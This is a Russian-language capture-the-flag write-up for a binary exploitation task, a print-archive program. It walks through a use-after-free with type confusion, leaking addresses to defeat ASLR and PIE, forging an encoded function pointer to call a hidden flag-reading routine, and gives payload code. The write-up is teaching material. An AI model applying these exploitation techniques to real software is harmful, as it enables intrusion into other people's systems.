**Use-After-Free и подмена указателя на функцию**

### Описание

> Автор: Invis_one

Школьную типографию закрыли десять лет назад. На полках остались выцветшие термолисты, а в старом принтере — ночная очередь печати. Архивариус разрешает делать копии и переклеивать этикетки, но единственный подлинник хранится на реставрационной ленте. Обычным заказом его не напечатать.


### Решение

Нам выдан `stripped` ELF под Linux x86-64. Программа представляет собой архив с полками и очередью печати. Через текстовый интерфейс можно создавать листы (`page`), добавлять их в очередь (`queue`), освобождать полки (`drop`), создавать этикетки (`label`), делать пробный оттиск (`preview`) и печатать заказ (`print`).

Для начала посмотрим, как устроены объекты. При анализе бинарника восстанавливается структура размером 128 байт. Первые 8 байт содержат тип и длину, затем идёт объединение с полями листа или содержимым этикетки:

```c
typedef struct {
    uint32_t kind;
    uint32_t length;
    union {
        struct {
            unsigned char *ink;
            uint64_t finish;
            uint64_t stamp;
            unsigned char paper[96];
        } page;
        unsigned char label[120];
    } content;
} Object;
```

Полка выделяется из общего массива, а заказ в очереди хранит **указатель** на объект. После команды `drop` полка помечается свободной, но уже поставленный в очередь заказ не удаляется. Если затем создать этикетку, она займёт ту же полку: программа обнулит память и перезапишет её новым типом объекта. При этом `preview` и `print` продолжают обращаться к объекту как к листу, не проверяя поле `kind`.

Получается **Use-After-Free на уровне слотов с type confusion**: память не освобождается через `free`, но жизненный цикл объекта завершён, а указатель из очереди остаётся действующим.

Важные смещения в объекте:

| Смещение | Поле при интерпретации как `PAGE` | Что записывает `label` |
| --- | --- | --- |
| `+0x04` | `length` | аргумент `WIDTH` |
| `+0x08` | `ink` | первые 8 байт переданного HEX |
| `+0x10` | `finish` | следующие 8 байт HEX |
| `+0x18` | `stamp` | следующие 8 байт HEX |

Таким образом, `label` позволяет управлять адресом, из которого `preview` читает данные, а также сохранённым обработчиком, вызываемым при `print`.

Сначала необходимо получить адрес объекта в куче. После `page 41` программа возвращает, например, поля `serial` и `routing`. Маршрутная квитанция формируется по следующему правилу:

```python
routing = rol64(address_of_object, 9) ^ serial
```

Операция обратима, значит адрес можно восстановить. Известно, что перед массивом объектов расположены четыре 64-битных поля, то есть его начало смещено на 32 байта от начала структуры архива (`Cabinet`). Размер одного объекта — 128 байт.

```python
object_addr = ror64(routing ^ serial, 9)
cabinet_addr = object_addr - 32 - 128 * slot
```

Получим ещё и адреса кода, а также случайные значения, необходимые для подделки обработчика. Выполняем последовательность команд:

```text
page 41
queue 0
drop 0
label 32 <адрес Cabinet в little-endian, записанный как HEX>
preview 0
```

Вместо обычного листа в очереди теперь находится этикетка. Первые восемь её байт интерпретируются как указатель `ink`. Мы записали туда адрес `Cabinet`, поэтому `preview` печатает 32 байта из начала этой структуры:

```text
Cabinet + 0x00: key
Cabinet + 0x08: sequence
Cabinet + 0x10: reference (адрес ordinary_finish)
Cabinet + 0x18: ribbon
```

Поле `reference` содержит указатель на функцию `ordinary_finish`, что позволяет вычислить базу PIE. Для выданного ELF относительное смещение этой функции равно `0x1c90`, а смещение скрытой `restoration_finish`, читающей `flag.txt`, — `0x2170`.

```python
pie_base = ordinary_finish_addr - 0x1c90
restoration_finish_addr = pie_base + 0x2170
```

Остаётся подменить обработчик печати. Однако указатель `finish` хранится не в открытом виде: перед сохранением его XOR'ят с `key` и циклически сдвигают влево на 23 бита. При вызове применяется обратная операция:

```c
encoded_finish = rol64((uint64_t)finish ^ key, 23);
finish = (Finisher)(ror64(encoded_finish, 23) ^ key);
```

Поскольку `key` уже известен, можно корректно закодировать адрес `restoration_finish`. Эта функция дополнительно проверяет, что длина листа равна нулю, а поле `stamp` совпадает с ожидаемой величиной. Квитанция `receipt` была получена при создании заказа `queue`.

```python
encoded_finish = rol64(restoration_finish_addr ^ key, 23)
required_stamp = (
    rol64((key + ribbon) & 0xffffffffffffffff, 17)
    ^ 0x726573746f726521
    ^ receipt
)
```

Повторно освобождаем полку и размещаем на её месте новую этикетку. Значение `WIDTH=0` задаёт нужную длину объекта, а в HEX последовательно записываем поддельные `ink`, `finish` и `stamp`:

```python
payload = p64(cabinet_addr) + p64(encoded_finish) + p64(required_stamp)
# drop 0
# label 0 <payload.hex()>
# print 0
```

После команды `print` программа декодирует наш указатель, переходит в `restoration_finish`, проверяет штамп и выводит содержимое `flag.txt`. ASLR и PIE обходятся через утечки, а выполнять shellcode или получать shell не требуется.
